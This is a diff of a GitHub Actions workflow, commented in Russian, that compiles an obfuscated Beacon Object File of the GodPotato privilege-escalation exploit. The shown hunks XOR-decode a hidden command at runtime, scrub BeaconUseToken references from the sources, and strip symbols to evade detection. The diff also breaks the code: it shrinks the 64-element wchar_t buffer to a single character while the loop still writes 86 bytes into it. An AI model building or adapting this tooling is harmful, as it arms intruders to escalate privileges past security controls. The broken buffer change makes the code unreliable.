@@ -61,12 +61,12 @@ jobs:
                 0x31, 0x00, 0x00, 0x00
             };
             
-            wchar_t clear_cmd[64];
+            wchar_t clear_cmd;
             for (i = 0; i < 43; i++) {
                 ((unsigned char*)clear_cmd)[i*2] = crypt_cmd[i*2] ^ 0x4B;
                 ((unsigned char*)clear_cmd)[i*2+1] = 0x00;
             }
-            clear_cmd[43] = L'\\0';
+            clear_cmd = L'\\0';
 
             KERNEL32$RtlSecureZeroMemory(&si, sizeof(si));
             si.cb = sizeof(si);
@@ -103,7 +103,7 @@ jobs:
             f.write(clean_entry_code)
         print("[+] entry.c successfully overwritten and cleaned.")
 
-        # Очищаем остальные файлы от упоминаний BeaconUseToken на случай проверок линкера
+        # Очищаем остальные файлы от упоминаний BeaconUseToken
         for root, dirs, files in os.walk("gpp-temp"):
             for file in files:
                 if file.endswith(".c") and file != "entry.c":
@@ -121,11 +121,12 @@ jobs:
       with:
         version: 0.14.1 
 
-    # 6. Сборка проекта (флаг -fstrip заменен на корректный линкер-флаг -Wl,-s)
+    # 6. Сборка проекта (shell: cmd принудительно переключает шаг на стандартную командную строку Windows)
     - name: Compile Obfuscated BOF File
+      shell: cmd
       run: |
         cd gpp-temp
-        zig cc -c entry.c -o ../GodPotatoBOF_Bypass.o -I. -Icommon -D_WIN32_WINNT=0x0600 -O ReleaseSmall -Wl,-s -fno-asynchronous-unwind-tables
+        zig cc -c entry.c -o ../GodPotatoBOF_Bypass.o -I. -Icommon -D_WIN32_WINNT=0x0600 -O ReleaseSmall "-Wl,-s" -fno-asynchronous-unwind-tables
         cd ..
 
     # 7. Загружаем готовый .o файл в артефакты репозитория GitHub
